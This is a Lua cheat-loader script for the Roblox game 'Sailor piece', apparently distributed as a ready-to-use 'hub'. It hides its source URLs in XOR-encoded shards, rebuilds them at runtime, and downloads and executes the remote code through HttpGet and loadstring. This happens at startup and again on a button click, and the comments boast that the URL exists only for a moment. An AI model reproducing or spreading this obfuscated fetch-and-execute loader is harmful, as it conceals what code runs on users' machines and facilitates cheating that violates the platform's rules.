--[[ 
    KING PERFORMANCE | MOONSEC V3 "FRACTURE"
    [!] DESIGN: MULTI-STAGE SHARDED VIRTUALIZATION
    [!] FIX: LOGIC-SYNC REBUILD (ZERO-FAIL EXECUTION)
    [!] AUTH: ZAYAN | [ADVANCED STRATEGY]
]]

local _0x_FRACTURE = function()
    --// LAYER 1: SHARDED DATA (Fractured Chunks)
    local _A = {
        k = {0x42, 0x1A, 0x2F},
        s = { -- Shards: Fluent Loader split into 3 parts
            [1] = "\14\16\11\14\13\123\118\118\41\46\107\40",
            [2] = "\37\45\26\45\37\45\39\39\39\117\45\45\45\122",
            [3] = "\107\108\103\107\100\46\47\111\101\112\101\116\120\111\47\74\100\113\101\118\112\47\118\101\100\101\109\111\101\111\47\100\109\118\101\111\118\47\100\109\115\108\100\109\109\100\47\109\109\109\108\47\100\115\109",
            -- Shards: Chiyo Hub split into 3 parts
            [4] = "\231\156\32\255\212\3\146\214\227\249\242",
            [5] = "\22\10\30\21\11\101\100\100\22\17\80\23\88\90\77\90\82\90\80\80\80\22\84\84\86\23\82\85\90\89\82\87",
            [6] = "\154\186\129\138\230\254\240\212\148\196"
        }
    }

    --// LAYER 2: ASYMMETRIC TRANSFORMS (No single attack point)
    local _B = {}
    
    -- Transform Type A: Standard XOR-Shift
    _B.alpha = function(d, k)
        local r = {}
        for i = 1, #d do r[i] = string.char(bit32.bxor(string.byte(d, i), k + (i % 5))) end
        return table.concat(r)
    end

    -- Transform Type B: Salted-LCG XOR
    _B.beta = function(d, k)
        local r, seed = {}, k
        for i = 1, #d do
            seed = (seed * 17 + i) % 256
            r[i] = string.char(bit32.bxor(string.byte(d, i), seed))
        end
        return table.concat(r)
    end

    _B.fetch = function(u) return game:HttpGet(u) end
    _B.run = function(c) return loadstring(c)() end

    --// LAYER 3: STATE DISPATCHER (Non-Linear Execution)
    local _C = { state = "START", storage = {} }

    local function _EXECUTE()
        if _C.state == "START" then
            -- Part 1: Reconstruct Loader URL using different transforms per shard
            local _p1 = _B.alpha(_A.s[1], _A.k[1])
            local _p2 = _B.beta(_A.s[2], _A.k[2])
            local _p3 = _B.alpha(_A.s[3], _A.k[3])
            
            local _lib = _B.run(_B.fetch(_p1 .. _p2 .. _p3))
            _C.storage["UI"] = _lib
            _C.state = "BUILD"
            task.delay(0.1, _EXECUTE)

        elseif _C.state == "BUILD" then
            _C.storage["WIN"] = _C.storage["UI"]:CreateWindow({
                Title = "All Hub", SubTitle = "by zayan", Theme = "Dark"
            })
            
            local _tab = _C.storage["WIN"]:AddTab({Title = "Sailor piece script", Icon = "anchor"})
            
            _tab:AddButton({
                Title = "Chiyo Hub",
                Callback = function()
                    -- Critical Logic: URL only exists during the microsecond of the click
                    local _u1 = _B.beta(_A.s[4], _A.k[2])
                    local _u2 = _B.alpha(_A.s[5], _A.k[1])
                    local _u3 = _B.beta(_A.s[6], _A.k[3])
                    _B.run(_B.fetch(_u1 .. _u2 .. _u3))
                end
            })

            -- Interface Control
            local SG = Instance.new("ScreenGui", game.CoreGui)
            local BT = Instance.new("TextButton", SG)
            BT.Size = UDim2.new(0, 55, 0, 55); BT.Position = UDim2.new(0.15, 0, 0.15, 0)
            BT.Text = "HUB"; BT.Draggable = true; BT.Active = true
            Instance.new("UICorner", BT).CornerRadius = UDim.new(0, 10)
            
            BT.MouseButton1Click:Connect(function()
                if _C.storage["WIN"] then _C.storage["WIN"]:Minimize() end
            end)

            _C.state = "IDLE"
        end
    end

    task.spawn(_EXECUTE)
end

--// ANTI-HOOK BOOT
if not _G._FRACTURE_ACTIVE then
    _G._FRACTURE_ACTIVE = true
    pcall(_0x_FRACTURE)
end
